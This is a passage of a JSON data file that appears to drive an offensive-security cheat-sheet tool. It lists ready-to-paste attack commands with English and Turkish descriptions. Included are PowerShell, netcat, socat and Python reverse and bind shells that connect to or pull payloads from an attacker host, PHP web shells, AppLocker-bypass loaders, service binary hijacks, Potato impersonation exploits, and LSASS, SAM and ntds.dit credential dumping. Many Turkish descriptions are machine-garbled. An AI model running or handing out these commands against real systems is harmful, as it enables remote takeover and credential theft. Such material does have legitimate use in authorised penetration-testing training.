              "echo -n '$client = New-Object System.Net.Sockets.TCPClient(\"<LHOST>\",<LPORT>);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + \"PS \" + (pwd).Path + \"> \";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()' | iconv -t UTF-16LE | base64 -w 0",
              "powershell -nop -enc <BASE64_OUTPUT>"
            ],
            "tags": [
              "essential"
            ],
            "desc_tr": "Base64-encoded PowerShell ters bağlantı kabuğu"
          },
          {
            "title": "PowerShell Download & Execute",
            "desc": "Download and execute reverse shell script",
            "cmd": "powershell -nop -c \"IEX(New-Object Net.WebClient).DownloadString('http://<LHOST>/shell.ps1')\"",
            "tags": [
              "essential"
            ],
            "desc_tr": "İndir: and execute ters bağlantı kabuğu script"
          },
          {
            "title": "Nishang Invoke-PowerShellTcp",
            "desc": "Nishang reverse shell module",
            "cmd": "powershell -nop -c \"IEX(New-Object Net.WebClient).DownloadString('http://<LHOST>/Invoke-PowerShellTcp.ps1'); Invoke-PowerShellTcp -Reverse -IPAddress <LHOST> -Port <LPORT>\"",
            "tags": [
              "tool"
            ],
            "desc_tr": "Nishang ters bağlantı kabuğu module"
          },
          {
            "title": "ConPtyShell (Full Interactive)",
            "desc": "Fully interactive Windows reverse shell",
            "cmds": [
              "# On attacker:",
              "stty raw -echo; (stty size; cat) | nc -lvnp <LPORT>",
              "# On target (PowerShell):",
              "IEX(IWR http://<LHOST>/Invoke-ConPtyShell.ps1 -UseBasicParsing); Invoke-ConPtyShell <LHOST> <LPORT>"
            ],
            "tags": [
              "advanced",
              "tool"
            ],
            "desc_tr": "Fully interactive Windows ters bağlantı kabuğu"
          },
          {
            "title": "Windows Netcat Reverse Shell",
            "desc": "Netcat reverse shell on Windows",
            "cmd": "nc.exe -e cmd.exe <LHOST> <LPORT>",
            "tags": [
              "essential"
            ],
            "desc_tr": "Netcat ters bağlantı kabuğu Windows üzerinde"
          },
          {
            "title": "PowerShell Reverse Shell (Compact)",
            "desc": "Shorter PowerShell reverse shell one-liner",
            "cmd": "powershell -nop -c \"$c=New-Object Net.Sockets.TCPClient('<LHOST>',<LPORT>);$s=$c.GetStream();[byte[]]$b=0..65535|%{0};while(($i=$s.Read($b,0,$b.Length))-ne 0){$d=(New-Object Text.ASCIIEncoding).GetString($b,0,$i);$r=(iex $d 2>&1|Out-String);$s.Write(([text.encoding]::ASCII).GetBytes($r),0,$r.Length)}\"",
            "tags": [
              "essential"
            ],
            "desc_tr": "Shorter PowerShell ters bağlantı kabuğu one-liner"
          },
          {
            "title": "PowerShell RunspacePool Shell",
            "desc": "Reverse shell using RunspacePool for stealth",
            "cmd": "powershell -nop -c \"$r=[RunspaceFactory]::CreateRunspace();$r.Open();$p=[PowerShell]::Create();$p.Runspace=$r;$p.AddScript({$c=New-Object Net.Sockets.TCPClient('<LHOST>',<LPORT>);$s=$c.GetStream();[byte[]]$b=0..65535|%{0};while(($i=$s.Read($b,0,$b.Length))-ne 0){$d=(New-Object Text.ASCIIEncoding).GetString($b,0,$i);$r=(iex $d 2>&1|Out-String);$s.Write(([text.encoding]::ASCII).GetBytes($r),0,$r.Length)}});$p.Invoke()\"",
            "tags": [
              "advanced"
            ],
            "desc_tr": "ters bağlantı kabuğu RunspacePool for stealth kullanarak"
          },
          {
            "title": "PowerCat Reverse Shell",
            "desc": "PowerShell netcat reverse shell module",
            "cmd": "powershell -nop -c \"IEX(New-Object Net.WebClient).DownloadString('http://<LHOST>/powercat.ps1'); powercat -c <LHOST> -p <LPORT> -e cmd.exe\"",
            "tags": [
              "tool"
            ],
            "desc_tr": "PowerShell netcat ters bağlantı kabuğu module"
          },
          {
            "title": "mshta Shell",
            "desc": "Shell via mshta LOLBin",
            "cmd": "mshta http://<ATTACKER_IP>/shell.hta",
            "tags": [
              "essential"
            ],
            "desc_tr": "Shell mshta LOLBüzerinden içinde"
          },
          {
            "title": "regsvr32 Shell",
            "desc": "Shell via regsvr32 AppLocker bypass",
            "cmd": "regsvr32 /s /n /u /i:http://<ATTACKER_IP>/shell.sct scrobj.dll",
            "tags": [
              "advanced"
            ],
            "desc_tr": "Shell regsvr32 AppLocker bypass üzerinden"
          },
          {
            "title": "PowerCat Shell",
            "desc": "PowerShell netcat alternative",
            "cmds": [
              "IEX(New-Object Net.WebClient).downloadString('http://<ATTACKER_IP>/powercat.ps1')",
              "powercat -c <ATTACKER_IP> -p <PORT> -e cmd.exe"
            ],
            "tags": [
              "tool"
            ],
            "desc_tr": "PowerShell netcat alternative"
          },
          {
            "title": "ConPtyShell",
            "desc": "Fully interactive Windows shell",
            "cmds": [
              "# Attacker: stty raw -echo; (stty size; cat) | nc -lvnp <PORT>",
              "# Target: IEX(IWR http://<ATTACKER_IP>/Invoke-ConPtyShell.ps1 -UseBasicParsing); Invoke-ConPtyShell -RemoteIp <ATTACKER_IP> -RemotePort <PORT>"
            ],
            "tags": [
              "advanced"
            ],
            "desc_tr": "Fully interactive Windows shell"
          }
        ],
        "name_tr": "Windows Reverse Shells"
      },
      {
        "name": "Bind Shells",
        "commands": [
          {
            "title": "Netcat Bind Shell (Linux)",
            "desc": "Start a bind shell listener on target",
            "cmd": "nc -lvnp <PORT> -e /bin/bash",
            "tags": [
              "essential"
            ],
            "desc_tr": "Başlat: a dinleyen kabuk listener target üzerinde"
          },
          {
            "title": "Netcat Bind Shell (mkfifo)",
            "desc": "Bind shell without -e flag",
            "cmd": "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc -lvnp <PORT> >/tmp/f",
            "tags": [
              "essential"
            ],
            "desc_tr": "dinleyen kabuk -e flag olmadan"
          },
          {
            "title": "Socat Bind Shell",
            "desc": "Socat bind shell with TTY",
            "cmd": "socat TCP-LISTEN:<PORT>,reuseaddr,fork EXEC:/bin/bash,pty,stderr,setsid,sigint,sane",
            "tags": [
              "essential"
            ],
            "desc_tr": "Socat dinleyen kabuk TTY ile"
          },
          {
            "title": "Python Bind Shell",
            "desc": "Python bind shell",
            "cmd": "python3 -c 'import socket,os,subprocess;s=socket.socket();s.bind((\"0.0.0.0\",<PORT>));s.listen(1);c,a=s.accept();os.dup2(c.fileno(),0);os.dup2(c.fileno(),1);os.dup2(c.fileno(),2);subprocess.call([\"/bin/sh\",\"-i\"])'",
            "tags": [
              "essential"
            ],
            "desc_tr": "Pythdinleyen kabuk üzerinde"
          },
          {
            "title": "Connect to Bind Shell",
            "desc": "Connect to an established bind shell",
            "cmd": "nc -nv <TARGET_IP> <PORT>",
            "tags": [
              "essential"
            ],
            "desc_tr": "Bağlan: an established dinleyen kabuk'e"
          }
        ],
        "name_tr": "Bind Shells"
      },
      {
        "name": "Web Shells",
        "commands": [
          {
            "title": "PHP System Shell",
            "desc": "PHP web shell using system()",
            "cmd": "<?php system($_GET['cmd']); ?>",
            "tags": [
              "essential"
            ],
            "desc_tr": "PHP web kabuğu system() kullanarak"
          },
          {
            "title": "PHP Passthru Shell",
            "desc": "PHP web shell using passthru()",
            "cmd": "<?php passthru($_REQUEST['cmd']); ?>",
            "tags": [
              "essential"
            ],
            "desc_tr": "PHP web kabuğu passthru() kullanarak"
          },
          {
            "title": "PHP Shell_Exec Shell",
            "desc": "PHP web shell using shell_exec()",
            "cmd": "<?php echo shell_exec($_GET['cmd']); ?>",
            "tags": [
              "essential"
            ],
            "desc_tr": "PHP web kabuğu shell_exec() kullanarak"
          },
          {
            "title": "PHP Exec Shell",
            "desc": "PHP web shell using exec()",
            "cmd": "<?php echo exec($_GET['cmd']); ?>",
            "tags": [
              "essential"
            ],
            "desc_tr": "PHP web kabuğu exec() kullanarak"
          },
          {
            "title": "PHP Proc_Open Shell",
            "desc": "PHP web shell using proc_open()",
            "cmd": "<?php $d=array(0=>array('pipe','r'),1=>array('pipe','w'),2=>array('pipe','w'));$p=proc_open($_GET['cmd'],$d,$pipes);echo stream_get_contents($pipes[1]);?>",
            "tags": [
              "advanced"
            ],
            "desc_tr": "PHP web kabuğu proc_open() kullanarak"
          },
          {
            "title": "Kali PHP Reverse Shell",
            "desc": "Use the full-featured Kali PHP reverse shell",
            "cmd": "cp /usr/share/webshells/php/php-reverse-shell.php shell.php && sed -i 's/127.0.0.1/<LHOST>/;s/1234/<LPORT>/' shell.php",
            "tags": [
              "essential"
            ],
            "note": "Edit $ip and $port in the file before uploading",
            "desc_tr": "Use the full-featured Kali PHP ters bağlantı kabuğu"
          },
          {
            "title": "Access Web Shell",
            "desc": "Execute commands via uploaded web shell",
            "cmd": "curl 'http://<TARGET_IP>/uploads/shell.php?cmd=id'",
            "tags": [
              "essential"
            ],
            "desc_tr": "Çalıştır: commands uploaded web kabuğu üzerinden"
          }
        ],
        "name_tr": "Web Shells"
      },
      {
        "name": "Interactive Shell Upgrade",
        "commands": [
          {
            "title": "Python PTY Spawn",
            "desc": "Spawn a PTY shell with Python",
            "cmd": "python3 -c 'import pty;pty.spawn(\"/bin/bash\")'",
            "tags": [
              "essential"
            ],
            "desc_tr": "Başlat: a PTY shell Pythile üzerinde"
          },
          {
            "title": "Python2 PTY Spawn",
            "desc": "Spawn a PTY shell with Python2",
            "cmd": "python -c 'import pty;pty.spawn(\"/bin/bash\")'",
            "tags": [
              "essential"
            ],
            "desc_tr": "Başlat: a PTY shell Python2 ile"
          },
          {
            "title": "Script PTY Spawn",
            "desc": "Spawn a PTY with script command",
            "cmd": "script /dev/null -c bash",
            "tags": [
              "essential"
            ],
            "desc_tr": "Başlat: a PTY script command ile"
          },
          {
            "title": "Full TTY Upgrade Process",
            "desc": "Complete process to get a fully interactive shell",
            "cmds": [
              "python3 -c 'import pty;pty.spawn(\"/bin/bash\")'",
              "# Press Ctrl+Z to background the shell",
              "stty raw -echo; fg",
              "export TERM=xterm",
              "stty rows <ROWS> cols <COLS>"
            ],
            "tags": [
              "essential"
            ],
            "note": "Get your terminal size with: stty size",
            "desc_tr": "Complete process get a fully interactive shell'e"
          },
          {
            "title": "Expect PTY Spawn",
            "desc": "Spawn PTY via expect",
            "cmd": "/usr/bin/expect -c 'spawn /bin/bash; interact'",
            "tags": [
              "advanced"
            ],
            "desc_tr": "Başlat: PTY expect üzerinden"
          },
          {
            "title": "Socat TTY Upgrade",
            "desc": "Upgrade shell to full TTY via socat",
            "cmds": [
              "# On attacker: socat file:`tty`,raw,echo=0 tcp-listen:<LPORT>",
              "# On target: socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:<LHOST>:<LPORT>"
            ],
            "tags": [
              "advanced"
            ],
            "desc_tr": "Upgrade shell full TTY socat üzerinden'e"
          },
          {
            "title": "Rlwrap for Windows Shells",
            "desc": "Use rlwrap for arrow key support on Windows shells",
            "cmd": "rlwrap nc -lvnp <LPORT>",
            "tags": [
              "essential"
            ],
            "note": "Essential for Windows reverse shells which don't support arrow keys",
            "desc_tr": "Use rlwrap for arrow key support Windows shells üzerinde"
          },
          {
            "title": "Export TERM Variable",
            "desc": "Set TERM for proper terminal behavior",
            "cmd": "export TERM=xterm-256color",
            "tags": [
              "essential"
            ],
            "desc_tr": "Ayarla: TERM for proper terminal behavior"
          },
          {
            "title": "Fix Shell PATH",
            "desc": "Set PATH for full command availability",
            "cmd": "export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin",
            "tags": [
              "essential"
            ],
            "desc_tr": "Ayarla: PATH for full command availability"
          }
        ],
        "name_tr": "Interactive Shell Upgrade"
      }
    ],
    "name_tr": "Kabuklar, Dinleyiciler ve Stabilizasyon",
    "description_tr": "Establish reverse shells, bind shells, and web shells across platforms, then upgrade to fully interactive TTYs for stable exploitation."
  },
  {
    "id": "win-escalation",
    "name": "Windows Privilege Escalation",
    "icon": "⬆️",
    "description": "Escalate privileges on Windows hosts through service misconfigurations, token abuse, credential harvesting, and kernel exploits.",
    "subcategories": [
      {
        "name": "System Reconnaissance",
        "commands": [
          {
            "title": "System Info",
            "desc": "Get detailed system information",
            "cmd": "systeminfo",
            "tags": [
              "essential"
            ],
            "desc_tr": "Al: detailed system information"
          },
          {
            "title": "Hostname",
            "desc": "Get computer name",
            "cmd": "hostname",
            "tags": [
              "essential"
            ],
            "desc_tr": "Al: computer name"
          },
          {
            "title": "Current User",
            "desc": "Display current username",
            "cmd": "whoami",
            "tags": [
              "essential"
            ],
            "desc_tr": "Display mevcut username"
          },
          {
            "title": "User Privileges",
            "desc": "List all privileges for current user",
            "cmd": "whoami /priv",
            "tags": [
              "essential"
            ],
            "desc_tr": "Listele: tüm privileges for mevcut user"
          },
          {
            "title": "User Groups",
            "desc": "List all group memberships",
            "cmd": "whoami /all",
            "tags": [
              "essential"
            ],
            "desc_tr": "Listele: tüm group memberships"
          },
          {
            "title": "List Local Users",
            "desc": "Enumerate all local user accounts",
            "cmd": "net user",
            "tags": [
              "essential"
            ],
            "desc_tr": "Listele: tüm yerel user accounts"
          },
          {
            "title": "User Details",
            "desc": "Get details for a specific user",
            "cmd": "net user <USER>",
            "tags": [
              "essential"
            ],
            "desc_tr": "Al: details for a belirli user"
          },
          {
            "title": "Local Administrators",
            "desc": "List members of administrators group",
            "cmd": "net localgroup administrators",
            "tags": [
              "essential"
            ],
            "desc_tr": "Listele: members of administrators group"
          },
          {
            "title": "Network Configuration",
            "desc": "Display network adapter configuration",
            "cmd": "ipconfig /all",
            "tags": [
              "essential"
            ],
            "desc_tr": "Display ağ arayüzü configuration"
          },
          {
            "title": "Routing Table",
            "desc": "Display routing table",
            "cmd": "route print",
            "tags": [
              "essential"
            ],
            "desc_tr": "Display yönlendirme tablosu"
          },
          {
            "title": "Active Connections",
            "desc": "Show active network connections",
            "cmd": "netstat -ano",
            "tags": [
              "essential"
            ],
            "desc_tr": "Göster: active network connections"
          },
          {
            "title": "Running Processes",
            "desc": "List all running processes",
            "cmd": "tasklist /v",
            "tags": [
              "essential"
            ],
            "desc_tr": "Listele: tüm çalışan process"
          },
          {
            "title": "Installed Software (WMIC)",
            "desc": "List installed software via WMIC",
            "cmd": "wmic product get name,version,vendor",
            "tags": [
              "essential"
            ],
            "desc_tr": "Listele: yüklü software WMIC üzerinden"
          },
          {
            "title": "Installed Patches",
            "desc": "List installed hotfixes",
            "cmd": "wmic qfe list full",
            "tags": [
              "essential"
            ],
            "desc_tr": "Listele: installed hotfixes"
          },
          {
            "title": "Scheduled Tasks",
            "desc": "List all scheduled tasks",
            "cmd": "schtasks /query /fo TABLE /nh",
            "tags": [
              "essential"
            ],
            "desc_tr": "Listele: tüm zamanlanmış görevler"
          },
          {
            "title": "Firewall State",
            "desc": "Check Windows Firewall status",
            "cmd": "netsh advfirewall show allprofiles",
            "tags": [
              "essential"
            ],
            "desc_tr": "Kontrol et: Windows güvenlik duvarı durumu"
          },
          {
            "title": "Antivirus Status",
            "desc": "Check installed antivirus (WMIC)",
            "cmd": "wmic /namespace:\\\\root\\securitycenter2 path antivirusproduct get displayname,productstate",
            "tags": [
              "essential"
            ],
            "desc_tr": "Kontrol et: installed antivirus (WMIC)"
          },
          {
            "title": "Drives List",
            "desc": "List all drives on the system",
            "cmd": "wmic logicaldisk get caption,description,freespace,size",
            "tags": [
              "essential"
            ],
            "desc_tr": "Listele: tüm drives the system üzerinde"
          },
          {
            "title": "WMIC Patches",
            "desc": "List installed patches",
            "cmd": "wmic qfe list full /format:csv",
            "tags": [
              "essential"
            ],
            "desc_tr": "Listele: yüklü patches"
          },
          {
            "title": "Defender Status",
            "desc": "Check Defender status",
            "cmd": "Get-MpComputerStatus | Select-Object RealTimeProtectionEnabled,AntivirusEnabled",
            "tags": [
              "essential"
            ],
            "desc_tr": "Kontrol et: Defender status"
          },
          {
            "title": "Defender Exclusions",
            "desc": "View excluded paths",
            "cmd": "Get-MpPreference | Select-Object -ExpandProperty ExclusionPath",
            "tags": [
              "essential"
            ],
            "desc_tr": "View excluded paths"
          },
          {
            "title": "Firewall Rules",
            "desc": "List firewall config",
            "cmd": "netsh advfirewall show allprofiles",
            "tags": [
              "essential"
            ],
            "desc_tr": "Listele: firewall config"
          },
          {
            "title": "Service Config",
            "desc": "Query service config",
            "cmd": "sc qc <SERVICE_NAME>",
            "tags": [
              "essential"
            ],
            "desc_tr": "Sorgula: service config"
          }
        ],
        "name_tr": "System Reconnaissance"
      },
      {
        "name": "Service Misconfigurations",
        "commands": [
          {
            "title": "List All Services",
            "desc": "Enumerate all Windows services",
            "cmd": "sc query state= all",
            "tags": [
              "essential"
            ],
            "desc_tr": "Listele: tüm Windows services"
          },
          {
            "title": "Service Details (SC)",
            "desc": "Get configuration details for a service",
            "cmd": "sc qc <SERVICE_NAME>",
            "tags": [
              "essential"
            ],
            "desc_tr": "Al: configuratidetails bir servis içüzerinde içinde"
          },
          {
            "title": "WMIC Service Paths",
            "desc": "List service binary paths (find unquoted)",
            "cmd": "wmic service get name,displayname,pathname,startmode",
            "tags": [
              "essential"
            ],
            "desc_tr": "Listele: service binary paths (find unquoted)"
          },
          {
            "title": "Find Unquoted Service Paths",
            "desc": "Identify services with unquoted paths containing spaces",
            "cmd": "wmic service get name,displayname,pathname,startmode | findstr /i /v \"C:\\Windows\\\\\" | findstr /i /v \"\\\"\"",
            "tags": [
              "essential"
            ],
            "desc_tr": "Tespit et: services unquoted paths containing spaces ile"
          },
          {
            "title": "Check Service Permissions (accesschk)",
            "desc": "Check which services current user can modify",
            "cmd": "accesschk.exe /accepteula -uwcqv <USER> * /c",
            "tags": [
              "essential",
              "tool"
            ],
            "desc_tr": "Kontrol et: which services mevcut user can modify"
          },
          {
            "title": "Check Service Binary Permissions",
            "desc": "Check permissions on a service binary",
            "cmd": "icacls \"C:\\path\\to\\service.exe\"",
            "tags": [
              "essential"
            ],
            "desc_tr": "Kontrol et: permissions a service binary üzerinde"
          },
          {
            "title": "Modify Service Binary Path",
            "desc": "Change service binary to payload (if writable)",
            "cmd": "sc config <SERVICE_NAME> binpath= \"C:\\temp\\shell.exe\"",
            "tags": [
              "essential"
            ],
            "desc_tr": "Change service binary payload (if writable)'e"
          },
          {
            "title": "Restart Service",
            "desc": "Stop and start a service",
            "cmds": [
              "sc stop <SERVICE_NAME>",
              "sc start <SERVICE_NAME>"
            ],
            "tags": [
              "essential"
            ],
            "desc_tr": "Durdur: and start a service"
          },
          {
            "title": "DLL Hijacking Check",
            "desc": "Use Procmon to find DLL hijack opportunities",
            "cmd": "# Use Procmon filter: Result=NAME NOT FOUND, Path ends with .dll",
            "tags": [
              "advanced"
            ],
            "note": "Place malicious DLL in writable path that service searches",
            "desc_tr": "Use Procmfind DLL hijack opportunities üzerinde'e"
          }
        ],
        "name_tr": "Service Misconfigurations"
      },
      {
        "name": "Registry & Scheduled Tasks",
        "commands": [
          {
            "title": "AutoLogon Credentials",
            "desc": "Check registry for auto-login credentials",
            "cmd": "reg query \"HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\" /v DefaultPassword",
            "tags": [
              "essential"
            ],
            "desc_tr": "Kontrol et: registry for auto-logkimlik bilgileri içinde"
          },
          {
            "title": "Putty Saved Sessions",
            "desc": "Check for stored Putty credentials",
            "cmd": "reg query \"HKCU\\Software\\SimonTatham\\PuTTY\\Sessions\" /s",
            "tags": [
              "essential"
            ],
            "desc_tr": "Kontrol et: for stored Putty kimlik bilgileri"
          },
          {
            "title": "VNC Stored Passwords",
            "desc": "Check for VNC stored passwords",
            "cmd": "reg query \"HKCU\\Software\\ORL\\WinVNC3\\Password\"",
            "tags": [
              "advanced"
            ],
            "desc_tr": "Kontrol et: for VNC stored passwords"
          },
          {
            "title": "Unattend.xml Files",
            "desc": "Search for unattended install files with creds",
            "cmd": "dir /s /b C:\\*unattend*.xml C:\\*sysprep*.xml C:\\*sysprep.inf 2>nul",
            "tags": [
              "essential"
            ],
            "desc_tr": "Ara: for unattended install files creds ile"
          },
          {
            "title": "Registry Run Keys",
            "desc": "Check autorun registry keys",
            "cmds": [
              "reg query HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run",
              "reg query HKCU\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run"
            ],
            "tags": [
              "essential"
            ],
            "desc_tr": "Kontrol et: autorun registry keys"
          },
          {
            "title": "Scheduled Tasks Writable",
            "desc": "Find writable scheduled task binaries",
            "cmd": "schtasks /query /fo LIST /v | findstr /i \"Task To Run\"",
            "tags": [
              "essential"
            ],
            "desc_tr": "Bul: writable zamanlanmış görevler binaries"
          },
          {
            "title": "Stored Credentials (cmdkey)",
            "desc": "List cached credentials",
            "cmd": "cmdkey /list",
            "tags": [
              "essential"
            ],
            "desc_tr": "Listele: cached kimlik bilgileri"
          },
          {
            "title": "RunAs with Saved Creds",
            "desc": "Execute as another user with stored credentials",
            "cmd": "runas /savecred /user:<USER> \"C:\\temp\\shell.exe\"",
            "tags": [
              "essential"
            ],
            "desc_tr": "Çalıştır: as another user stored kimlik bilgileri ile"
          }
        ],
        "name_tr": "Registry & Scheduled Tasks"
      },
      {
        "name": "Token Abuse & Impersonation",
        "commands": [
          {
            "title": "Check SeImpersonatePrivilege",
            "desc": "Check if current user has impersonation privilege",
            "cmd": "whoami /priv | findstr /i \"SeImpersonate SeAssignPrimaryToken\"",
            "tags": [
              "essential"
            ],
            "desc_tr": "Kontrol et: if mevcut user has impersonatiprivilege üzerinde"
          },
          {
            "title": "JuicyPotato",
            "desc": "Exploit SeImpersonate with JuicyPotato",
            "cmd": "JuicyPotato.exe -l <RANDOM_PORT> -p C:\\temp\\shell.exe -t * -c {F87B28F1-DA9A-4F35-8EC0-800EFCF26B83}",
            "tags": [
              "essential",
              "tool"
            ],
            "note": "Works on Windows Server 2008-2016, Windows 7-10 (before certain patches)",
            "desc_tr": "İstismar et: r SeImpersonate JuicyPotaile'e"
          },
          {
            "title": "PrintSpoofer",
            "desc": "Exploit SeImpersonate via print spooler",
            "cmd": "PrintSpoofer.exe -c \"C:\\temp\\shell.exe\"",
            "tags": [
              "essential",
              "tool"
            ],
            "note": "Works on Windows 10 and Server 2016/2019",
            "desc_tr": "İstismar et: r SeImpersonate print spooler üzerinden"
          },
          {
            "title": "GodPotato",
            "desc": "Exploit SeImpersonate with GodPotato",
            "cmd": "GodPotato.exe -cmd \"C:\\temp\\shell.exe\"",
            "tags": [
              "essential",
              "tool"
            ],
            "note": "Works on Windows Server 2012-2022, Windows 8-11",
            "desc_tr": "İstismar et: r SeImpersonate GodPotaile'e"
          },
          {
            "title": "SweetPotato",
            "desc": "Exploit SeImpersonate with SweetPotato",
            "cmd": "SweetPotato.exe -e EfsRpc -p C:\\temp\\shell.exe",
            "tags": [
              "tool"
            ],
            "desc_tr": "İstismar et: r SeImpersonate SweetPotaile'e"
          },
          {
            "title": "RoguePotato",
            "desc": "Exploit SeImpersonate with RoguePotato",
            "cmd": "RoguePotato.exe -r <ATTACKER_IP> -e \"C:\\temp\\shell.exe\" -l <RANDOM_PORT>",
            "tags": [
              "tool"
            ],
            "desc_tr": "İstismar et: r SeImpersonate RoguePotaile'e"
          },
          {
            "title": "Check SeBackupPrivilege",
            "desc": "Check for backup privilege (read any file)",
            "cmd": "whoami /priv | findstr /i \"SeBackup\"",
            "tags": [
              "essential"
            ],
            "desc_tr": "Kontrol et: for backup privilege (read any file)"
          },
          {
            "title": "Check SeRestorePrivilege",
            "desc": "Check for restore privilege (write any file)",
            "cmd": "whoami /priv | findstr /i \"SeRestore\"",
            "tags": [
              "essential"
            ],
            "desc_tr": "Kontrol et: for restore privilege (write any file)"
          },
          {
            "title": "Check SeDebugPrivilege",
            "desc": "Check for debug privilege (access any process)",
            "cmd": "whoami /priv | findstr /i \"SeDebug\"",
            "tags": [
              "advanced"
            ],
            "desc_tr": "Kontrol et: for debug privilege (access any process)"
          },
          {
            "title": "SeDebugPrivilege Exploit (Mimikatz)",
            "desc": "Dump LSASS with debug privilege",
            "cmd": "mimikatz.exe \"privilege::debug\" \"sekurlsa::logonpasswords\" \"exit\"",
            "tags": [
              "advanced",
              "tool"
            ],
            "note": "SeDebugPrivilege allows reading any process memory",
            "desc_tr": "Dökümle: LSASS debug privilege ile"
          },
          {
            "title": "SeDebugPrivilege Procdump LSASS",
            "desc": "Dump LSASS process memory with procdump",
            "cmd": "procdump.exe -ma lsass.exe lsass.dmp -accepteula",
            "tags": [
              "advanced",
              "tool"
            ],
            "note": "Analyze dump offline with pypykatz or mimikatz",
            "desc_tr": "Dökümle: LSASS process memory procdump ile"
          },
          {
            "title": "SeBackupPrivilege File Read",
            "desc": "Read any file using backup privilege",
            "cmds": [
              "Import-Module .\\SeBackupPrivilegeUtils.dll",
              "Import-Module .\\SeBackupPrivilegeCmdLets.dll",
              "Copy-FileSeBackupPrivilege C:\\Windows\\NTDS\\ntds.dit C:\\temp\\ntds.dit"
            ],
            "tags": [
              "advanced"
            ],
            "desc_tr": "Oku: any file backup privilege kullanarak"
          },
          {
            "title": "SeRestorePrivilege DLL Hijack",
            "desc": "Write to any location using restore privilege",
            "cmd": "# SeRestorePrivilege allows writing any file - use to overwrite service DLLs or system binaries",
            "tags": [
              "advanced"
            ],
            "note": "Write a malicious DLL to a system path, then trigger the service",
            "desc_tr": "Yaz: any locatirestore privilege kullanarak üzerinde'e"
          },
          {
            "title": "SeTakeOwnershipPrivilege",
            "desc": "Take ownership of any file and read it",
            "cmds": [
              "takeown /f C:\\path\\to\\sensitive\\file",
              "icacls C:\\path\\to\\sensitive\\file /grant <USER>:F",
              "type C:\\path\\to\\sensitive\\file"
            ],
            "tags": [
              "advanced"
            ],
            "desc_tr": "Take ownership of any file and read it"
          },
          {
            "title": "Check All Privileges",
            "desc": "List all current token privileges with status",
            "cmd": "whoami /priv",
            "tags": [
              "essential"
            ],
            "desc_tr": "Listele: tüm mevcut token privileges status ile"
          },
          {
            "title": "Get-Acl Check Permissions",
            "desc": "Check ACL permissions on a file or directory",
            "cmd": "powershell -c \"Get-Acl 'C:\\path\\to\\file' | Format-List\"",
            "tags": [
              "essential"
            ],
            "desc_tr": "Kontrol et: ACL permissions a file or directory üzerinde"
          },
          {
            "title": "Get-Acl Service Registry",
            "desc": "Check permissions on service registry key",
            "cmd": "powershell -c \"Get-Acl 'HKLM:\\SYSTEM\\CurrentControlSet\\Services\\<SERVICE_NAME>' | Format-List\"",
            "tags": [
              "tool"
            ],
            "desc_tr": "Kontrol et: permissions service registry key üzerinde"
          },
          {
            "title": "icacls Check File Permissions",
            "desc": "Check detailed file ACL permissions",
            "cmd": "icacls \"C:\\path\\to\\file\"",
            "tags": [
              "essential"
            ],
            "desc_tr": "Kontrol et: detailed file ACL permissions"
          },
          {
            "title": "icacls Check Program Files",
            "desc": "Find writable directories in Program Files",
            "cmd": "icacls \"C:\\Program Files\" /T /C 2>nul | findstr /i \"(F) (M) (W) Everyone Users BUILTIN\"",
            "tags": [
              "essential"
            ],
            "desc_tr": "Bul: writable directories Program Files içinde"
          },
          {
            "title": "icacls Check Service Binaries",
            "desc": "Check if service binary path is writable",
            "cmd": "for /f \"tokens=2 delims='='\" %a in ('wmic service list full^|find /i \"pathname\"^|find /i /v \"system32\"') do @echo %a >> services.txt & icacls \"%a\" 2>nul",
            "tags": [
              "advanced"
            ],
            "desc_tr": "Kontrol et: if service binary path is writable"
          },
          {
            "title": "EfsPotato",
            "desc": "Exploit SeImpersonate via EFS service",
            "cmd": "EfsPotato.exe \"C:\\temp\\shell.exe\"",
            "tags": [
              "tool"
            ],
            "note": "Works on Windows 10/Server 2016-2019",
            "desc_tr": "İstismar et: r SeImpersonate EFS service üzerinden"
          }
        ],
        "name_tr": "Token Abuse & Impersonation"
      },
      {
        "name": "Credential Harvesting",
        "commands": [
          {
            "title": "Search for Passwords in Files",
            "desc": "Recursively search for password strings",
            "cmd": "findstr /si password *.txt *.ini *.config *.xml *.php",
            "tags": [
              "essential"
            ],
            "desc_tr": "Recursively search for password strings"
          },
          {
            "title": "PowerShell History",
            "desc": "Read PowerShell command history",
            "cmd": "type %APPDATA%\\Microsoft\\Windows\\PowerShell\\PSReadLine\\ConsoleHost_history.txt",
            "tags": [
              "essential"
            ],
            "desc_tr": "Oku: PowerShell komut geçmişi"
          },
          {
            "title": "PowerShell History (PS)",
            "desc": "Read PS history from PowerShell",
            "cmd": "Get-Content (Get-PSReadLineOption).HistorySavePath",
            "tags": [
              "essential"
            ],
            "desc_tr": "Oku: PS history PowerShell üzerinden"
          },
          {
            "title": "WiFi Passwords",
            "desc": "Extract saved WiFi passwords",
            "cmds": [
              "netsh wlan show profiles",
              "netsh wlan show profile name=\"<WIFI_NAME>\" key=clear"
            ],
            "tags": [
              "essential"
            ],
            "desc_tr": "Çıkart: kayıtlı WiFi passwords"
          },
          {
            "title": "SAM & SYSTEM Backup Files",
            "desc": "Check for accessible SAM/SYSTEM backup copies",
            "cmds": [
              "dir C:\\Windows\\Repair\\SAM",
              "dir C:\\Windows\\Repair\\SYSTEM",
              "dir C:\\Windows\\System32\\config\\RegBack\\SAM",
              "dir C:\\Windows\\System32\\config\\RegBack\\SYSTEM"
            ],
            "tags": [
              "essential"
            ],
            "desc_tr": "Kontrol et: for accessible SAM/SYSTEM backup copies"
          },
          {
            "title": "Copy SAM with Shadow Copies",
            "desc": "Extract SAM via volume shadow copies",
            "cmds": [
              "wmic shadowcopy list brief",
              "copy \\\\?\\GLOBALROOT\\Device\\HarddiskVolumeShadowCopy1\\Windows\\System32\\config\\SAM C:\\temp\\SAM",
